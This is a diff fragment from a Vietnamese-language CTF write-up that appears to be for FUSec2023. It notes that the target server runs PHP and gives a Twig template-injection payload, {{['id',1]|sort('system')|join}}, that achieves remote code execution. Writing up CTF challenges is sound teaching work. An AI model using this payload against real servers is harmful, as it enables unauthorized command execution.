@@ -205,6 +205,7 @@ Sau một số bước phân tích thì ta biết rằng server chạy PHP với
   <img src="https://github.com/bananNat/FUSec2023/assets/50787038/b8ea4dc6-6808-4d5d-b16b-2fe469cca4ad">
 </p>
 Và sau khi tiếp tục research tìm được payload để RCE như sau:
+
 ```
 {{['id',1]|sort('system')|join}}
 ```
